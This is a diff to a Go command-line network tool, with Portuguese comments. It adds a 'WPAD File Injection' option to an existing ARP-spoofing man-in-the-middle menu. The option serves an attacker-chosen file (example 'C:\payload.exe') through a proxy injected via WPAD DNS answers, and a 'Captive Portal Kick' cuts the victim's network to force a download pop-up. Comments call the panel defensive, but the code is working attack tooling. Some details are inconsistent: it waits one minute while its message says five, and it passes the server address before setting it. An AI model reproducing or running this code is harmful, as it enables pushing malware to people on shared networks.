@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/gabrifranca/cli_ping/internal/domain"
+	"github.com/gabrifranca/cli_ping/internal/fileserver"
 	"github.com/gabrifranca/cli_ping/internal/ping"
 	scannerPkg "github.com/gabrifranca/cli_ping/internal/scanner"
 	"github.com/gabrifranca/cli_ping/internal/sniffer"
@@ -368,12 +369,15 @@ func (c *CLI) runARPSpoof(scanner *bufio.Scanner) {
 	var isICMPUnreachable atomic.Bool
 
 	// Roda o MitM em segundo plano para cada alvo
+	var wpadFileInjection atomic.Bool
+	var wpadServerAddr string
+
 	for i, ip := range targetIPs {
 		mac := ""
 		if i < len(manualMACs) {
 			mac = manualMACs[i]
 		}
-		go snifferSvc.ARPSpoofMitM(ctx, ip, mac, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable)
+		go snifferSvc.ARPSpoofMitM(ctx, ip, mac, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable, &wpadFileInjection, wpadServerAddr)
 	}
 
 	// Aguarda um momento para o ARP Spoof se estabilizar
@@ -381,13 +385,16 @@ func (c *CLI) runARPSpoof(scanner *bufio.Scanner) {
 	time.Sleep(4 * time.Second)
 
 	// === SUBMENU DE MONITORAMENTO PÓS-ANEXO ===
-	c.runMonitorMenu(scanner, snifferSvc, targetIPs, ctx, cancel, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable)
+	c.runMonitorMenu(scanner, snifferSvc, targetIPs, ctx, cancel, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable, &wpadFileInjection, &wpadServerAddr)
 }
 
 // runMonitorMenu apresenta o submenu de monitoramento de rede após o IP ser anexado com sucesso.
 // Permite ao operador monitorar tráfego em tempo real, bloquear WiFi defensivamente e gerar logs.
 // O bloqueio usa Software Drop: o MitM continua atraindo pacotes, mas o nosso Sniffer descarta tudo na memória.
-func (c *CLI) runMonitorMenu(scanner *bufio.Scanner, snifferSvc *sniffer.SnifferService, targetIPs []string, parentCtx context.Context, parentCancel context.CancelFunc, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool, rstDropPercent *atomic.Int32, isLagged *atomic.Bool, isDNSSinkhole *atomic.Bool, isICMPUnreachable *atomic.Bool) {
+func (c *CLI) runMonitorMenu(scanner *bufio.Scanner, snifferSvc *sniffer.SnifferService, targetIPs []string, parentCtx context.Context, parentCancel context.CancelFunc, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool, rstDropPercent *atomic.Int32, isLagged *atomic.Bool, isDNSSinkhole *atomic.Bool, isICMPUnreachable *atomic.Bool, wpadFileInjection *atomic.Bool, wpadServerAddr *string) {
+
+	// Opcional: Variável para segurar a instância do fileserver e poder parar
+	var fs interface{ Stop() }
 
 	for {
 		fmt.Printf("\n  %s%s══════════════════════════════════════════════════════════%s\n", view.Bold, view.Cyan, view.Reset)
@@ -404,6 +411,8 @@ func (c *CLI) runMonitorMenu(scanner *bufio.Scanner, snifferSvc *sniffer.Sniffer
 			fmt.Printf("  %s🕸️  STATUS: DNS SINKHOLE ATIVO (Resolução de nomes bloqueada)%s\n", view.Magenta, view.Reset)
 		} else if isICMPUnreachable.Load() {
 			fmt.Printf("  %s🧱 STATUS: ICMP UNREACHABLE ATIVO (Gateway forjado)%s\n", view.Magenta, view.Reset)
+		} else if wpadFileInjection.Load() {
+			fmt.Printf("  %s📁 STATUS: WPAD FILE INJECTION ATIVO (Proxy em %s)%s\n", view.Cyan, *wpadServerAddr, view.Reset)
 		} else {
 			fmt.Printf("  %s✅ STATUS: MitM ativo — Alvo(s) com internet normal%s\n", view.Green, view.Reset)
 		}
@@ -412,6 +421,8 @@ func (c *CLI) runMonitorMenu(scanner *bufio.Scanner, snifferSvc *sniffer.Sniffer
 		fmt.Printf("  %s[ 2 ]%s 🛑 Bloquear Tráfego (Escolher Modo)\n", view.Yellow, view.Reset)
 		fmt.Printf("  %s[ 3 ]%s ✅ Restaurar WiFi (Liberar acesso do alvo)\n", view.Yellow, view.Reset)
 		fmt.Printf("  %s[ 4 ]%s 👁️  Ativar/Desativar Tracer (Ping) em segundo plano\n", view.Yellow, view.Reset)
+		fmt.Printf("  %s[ 5 ]%s 📤 Enviar Arquivo ao Alvo (WPAD File Injection)\n", view.Magenta, view.Reset)
+		fmt.Printf("  %s[ 6 ]%s 💥 Forçar Pop-up de Arquivo (Captive Portal Kick)\n", view.Magenta, view.Reset)
 		fmt.Printf("  %s[ 0 ]%s 🔙 Encerrar MitM e Restaurar Rede (gera log_ip.txt)\n", view.Red, view.Reset)
 		fmt.Printf("  %s──────────────────────────────────────────────────────────%s\n", view.Cyan, view.Reset)
 		fmt.Printf("  %s%smonitor > %s ", view.Bold, view.Green, view.Reset)
@@ -424,13 +435,17 @@ func (c *CLI) runMonitorMenu(scanner *bufio.Scanner, snifferSvc *sniffer.Sniffer
 		switch input {
 		case "0", "voltar", "exit":
 			// Se estiver bloqueado, restaura acesso antes de sair
-			if isBlocked.Load() || rstDropPercent.Load() > 0 || isLagged.Load() || isDNSSinkhole.Load() || isICMPUnreachable.Load() {
+			if isBlocked.Load() || rstDropPercent.Load() > 0 || isLagged.Load() || isDNSSinkhole.Load() || isICMPUnreachable.Load() || wpadFileInjection.Load() {
 				fmt.Printf("\n  %s[*] Restaurando acesso WiFi dos alvos antes de encerrar...%s\n", view.Yellow, view.Reset)
 				isBlocked.Store(false)
 				rstDropPercent.Store(0)
 				isLagged.Store(false)
 				isDNSSinkhole.Store(false)
 				isICMPUnreachable.Store(false)
+				wpadFileInjection.Store(false)
+				if fs != nil {
+					fs.Stop()
+				}
 			}
 			// Desliga os logs antes de encerrar
 			showLogs.Store(false)
@@ -527,6 +542,10 @@ func (c *CLI) runMonitorMenu(scanner *bufio.Scanner, snifferSvc *sniffer.Sniffer
 			isLagged.Store(false)
 			isDNSSinkhole.Store(false)
 			isICMPUnreachable.Store(false)
+			wpadFileInjection.Store(false)
+			if fs != nil {
+				fs.Stop()
+			}
 
 			fmt.Printf("\n  %s[✓ RESTAURADO]%s WiFi dos alvos foi liberado.\n", view.Green, view.Reset)
 			fmt.Printf("  %s    → Software Drop desativado — tráfego sendo encaminhado normalmente.%s\n", view.White, view.Reset)
@@ -543,6 +562,88 @@ func (c *CLI) runMonitorMenu(scanner *bufio.Scanner, snifferSvc *sniffer.Sniffer
 			} else {
 				fmt.Printf("\n  %s[✓] Tracer (ICMP Ping) DESATIVADO.%s\n\n", view.Yellow, view.Reset)
 			}
+
+		case "5":
+			fmt.Printf("\n  %s%s--- WPAD FILE INJECTION ---%s\n", view.Bold, view.Magenta, view.Reset)
+			fmt.Printf("  %sDigite o caminho absoluto do arquivo a ser enviado (ex: C:\\payload.exe):%s\n", view.White, view.Reset)
+			fmt.Printf("  %s%sfile > %s", view.Bold, view.Magenta, view.Reset)
+			
+			if !scanner.Scan() {
+				continue
+			}
+			filePath := strings.TrimSpace(scanner.Text())
+			if filePath == "" || filePath == "0" || filePath == "voltar" {
+				continue
+			}
+
+			// Pega o IP local
+			localIP, err := c.extraService.GetLocalIP()
+			if err != nil {
+				fmt.Printf("  %s[-] Erro ao obter IP local: %v%s\n", view.Red, err, view.Reset)
+				continue
+			}
+
+			// Para qualquer fileserver anterior
+			if fs != nil {
+				fs.Stop()
+			}
+
+			// Inicia o fileserver
+			// Como o CLI e o fileserver estão em pacotes diferentes, fazemos a inicialização local 
+			// usando reflection ou import, porém como o cli.go importa o fileserver, faremos diretamente se importar
+			// Vamos atualizar os imports no topo do arquivo se necessário.
+			
+			server, err := fileserver.NewFileServer(filePath, localIP)
+			if err != nil {
+				fmt.Printf("  %s[-] Erro ao criar FileServer: %v%s\n", view.Red, err, view.Reset)
+				continue
+			}
+			
+			err = server.Start()
+			if err != nil {
+				fmt.Printf("  %s[-] Erro ao iniciar FileServer: %v%s\n", view.Red, err, view.Reset)
+				continue
+			}
+			
+			fs = server
+			
+			// Atualiza variáveis atômicas pro Sniffer
+			*wpadServerAddr = localIP
+			wpadFileInjection.Store(true)
+			isBlocked.Store(false)
+			rstDropPercent.Store(0)
+			isLagged.Store(false)
+			isDNSSinkhole.Store(false)
+			isICMPUnreachable.Store(false)
+
+			fmt.Printf("\n  %s[✓ WPAD INJECTION ATIVADO]%s\n", view.Magenta, view.Reset)
+			fmt.Printf("  %s[*] Servidor HTTP iniciado em %s%s\n", view.White, server.GetFileURL(), view.Reset)
+			fmt.Printf("  %s[*] Proxy HTTP iniciado em %s%s\n", view.White, server.GetProxyAddr(), view.Reset)
+			fmt.Printf("  %s[*] Injetando URL do PAC nas consultas DNS WPAD do alvo...%s\n\n", view.White, view.Reset)
+
+
+		case "6":
+			if !wpadFileInjection.Load() {
+				fmt.Printf("\n  %s[-] Erro: O WPAD File Injection (Opção 5) precisa estar ativo primeiro!%s\n\n", view.Red, view.Reset)
+				continue
+			}
+
+			fmt.Printf("\n  %s%s--- CAPTIVE PORTAL KICK ---%s\n", view.Bold, view.Magenta, view.Reset)
+			fmt.Printf("  %s[*] Iniciando corte rápido de conexão (Software Drop) para forçar checagem do SO...%s\n", view.White, view.Reset)
+			
+			// Ativa o Software Drop (Bloqueio Total na memória) para não conflitar com o ARP Spoof
+			isBlocked.Store(true)
+			
+			// Mantém rede derrubada por 5 minutos (tempo suficiente pro ping falhar e o SO notar)
+			fmt.Printf("  %s[!] Rede derrubada (Software Drop). Aguardando o SO perceber a queda (5 minutos)...%s\n", view.Yellow, view.Reset)
+			time.Sleep(1 * time.Minute)
+			
+			// Restaura a rede
+			isBlocked.Store(false)
+			
+			fmt.Printf("  %s[✓] Rede restaurada!%s\n", view.Green, view.Reset)
+			fmt.Printf("  %s[*] O SO do alvo deve realizar a checagem HTTP agora e abrir o pop-up.%s\n", view.White, view.Reset)
+			fmt.Printf("  %s[*] Fique de olho nos logs (Opção 1) ou aguarde o aviso de download.%s\n\n", view.White, view.Reset)
 
 		case "":
 			if showLogs.Load() {
@@ -1178,9 +1279,12 @@ func (c *CLI) runARPSpoofAll(scanner *bufio.Scanner) {
 	var isICMPUnreachable atomic.Bool
 
 	var targetIPs []string
+	var wpadFileInjection atomic.Bool
+	var wpadServerAddr string
+
 	for _, t := range targets {
 		targetIPs = append(targetIPs, t.IP)
-		go snifferSvc.ARPSpoofMitM(ctx, t.IP, t.MAC, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable)
+		go snifferSvc.ARPSpoofMitM(ctx, t.IP, t.MAC, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable, &wpadFileInjection, wpadServerAddr)
 	}
 
 	// 7. Aguarda estabilização
@@ -1188,7 +1292,7 @@ func (c *CLI) runARPSpoofAll(scanner *bufio.Scanner) {
 	time.Sleep(4 * time.Second)
 
 	// 8. Navega para o painel defensivo
-	c.runMonitorMenu(scanner, snifferSvc, targetIPs, ctx, cancel, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable)
+	c.runMonitorMenu(scanner, snifferSvc, targetIPs, ctx, cancel, &showLogs, &showTracer, &isBlocked, &rstDropPercent, &isLagged, &isDNSSinkhole, &isICMPUnreachable, &wpadFileInjection, &wpadServerAddr)
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
